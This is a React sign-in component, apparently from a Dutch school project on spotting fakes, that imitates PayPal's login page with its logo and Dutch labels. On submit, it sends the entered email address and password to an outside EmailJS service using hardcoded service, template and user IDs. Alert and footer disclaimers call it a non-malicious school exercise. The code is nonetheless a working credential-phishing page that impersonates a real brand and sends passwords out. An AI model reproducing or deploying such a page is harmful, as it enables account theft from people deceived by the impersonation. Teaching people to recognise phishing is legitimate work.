import React, { useEffect, useState } from "react";
import emailjs from "emailjs-com";
import { Popover, PopoverHeader, PopoverBody } from "reactstrap";
import "./SignIn.css";
import moller_logo from "../../assets/moller_logo.png";

function SignIn() {
  const logo = "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg";

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [popoverOpen, setPopoverOpen] = useState(false);

  const togglePopover = () => setPopoverOpen(!popoverOpen);

  const service_id = "service_r10yy1p";
  const template_id = "template_6tbtipc";
  const user_id = "user_EjrsDgwCIIV6ZOcW16y6V";

  useEffect(() => {
    alert(
      "This is a school project. There was no intention of real scamming. Data will not be stored. This is part of the NLT Echt of Vals module"
    );
  }, []);

  function handelSubmit(e) {
    e.preventDefault();

    const templateParams = {
      to_email: email,
      message_password: password,
    };
    emailjs.send(service_id, template_id, templateParams, user_id).then(() => {
      setEmail("");
      setPassword("");
    });
  }

  return (
    <div className="signIn">
      <div className="signIn__container">
        <img src={logo} alt="" />
        <div className="signIn__form">
          <form onSubmit={handelSubmit}>
            <div className="signIn__form">
              <input
                id="email"
                type="email"
                placeholder="E-mailadres"
                onChange={(e) => setEmail(e.target.value)}
                value={email}
              />
            </div>
            <div className="signIn__form">
              <input
                id="password"
                type="password"
                placeholder="Wachtwoord"
                onChange={(e) => setPassword(e.target.value)}
                value={password}
              />
            </div>
            <div className="signIn__form">
              <button>Log In</button>
            </div>
          </form>
        </div>
        <div className="signIn__openAcountForm">
          <button className="signIn__openAcount">Rekening openen</button>
        </div>
      </div>
      <img className="signIn__mollerLogo" src={moller_logo} alt="" />
      <div>
        <Popover
          trigger="legacy"
          placement="top"
          isOpen={popoverOpen}
          target="disclaimer"
          toggle={togglePopover}
          className="popover"
        >
          <PopoverHeader className="popover__header">Disclaimer</PopoverHeader>
          <PopoverBody className="popover__body">
            This website is part of our school project. There are no intentions
            of real scamming. Submited data will not be saved. - NLT Echt of
            Vals
          </PopoverBody>
        </Popover>
      </div>
      <div className="signIn__footer">
        <div className="signIn__footerItems">
          <p className="signIn__footerItem">Contact</p>
          <p className="signIn__footerItem">Privacy</p>
          <p className="signIn__footerItem">Juridisch</p>
          <p className="signIn__footerItem">Wereldwijd</p>
          <p className="signIn__footerItem disclaimer" id="disclaimer">
            Disclaimer
          </p>
        </div>
      </div>
    </div>
  );
}

export default SignIn;
